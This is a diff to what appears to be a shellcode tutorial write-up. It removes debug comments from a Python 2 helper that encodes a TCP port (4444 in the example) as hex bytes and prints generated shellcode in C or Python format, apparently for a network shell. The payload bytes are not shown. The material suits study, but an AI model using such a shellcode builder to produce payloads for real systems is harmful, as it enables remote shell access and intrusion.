@@ -779,16 +779,12 @@ hexPort = "{:02x}".format(deciPort)
 #print "Hex value of Decimal Number:",hexPort
 # Check the length of the output hex string
 hexStrLen = len(hexPort)
-#print "string Length is:",hexStrLen
 # Check if the hex string is even or odd with modulus 2
 oddEven = hexStrLen % 2
 # if it returns 1 then it's odd. We need to add a leading 0
 if oddEven == 1:
-    #print "odd - Adding a leading zero."
     hexPort = "0" + hexPort
     #print hexPort    # commented out. Used for debugging
-#else:  # debugging
-    #print "even - Printing Hex String"
 # converts the  port number into the correct hex format
 tcpPort = "\\x".join(hexPort[i:i+2] for i in range(0,len(hexPort), 2))
 print "Your TCP Port in Hex is:","\\x"+tcpPort
@@ -827,16 +823,13 @@ for x in bytearray(scPart2) :
 print "Choose your shellcode export format."
 exportFormat = raw_input("[1] = C Format\n[2] = Python Format\n[1]: ")
 if exportFormat == "2" : 
-    #print "python format"
     formatSC = '"\nshellcode += "'.join(shellcode[i:i+48] for i in range(0,len(shellcode), 48))
     print "[-----------------------Your-Shellcode------------------------]"
     print 'shellcode = "'+formatSC+'"'
 else :
-    #print "C format"
     formatSC = '"\n"'.join(shellcode[i:i+48] for i in range(0,len(shellcode), 48))
     print "[----------------Your-Shellcode------------------]"
     print ' unsigned char shellcode[] = \\\n"'+formatSC+'";'
-#formatSC = "\n".join(shellcode[i:i+48] for i in range(0,len(shellcode), 48))
 ```
 + Awesome! Now lets test it with the TCP Port 4444
 
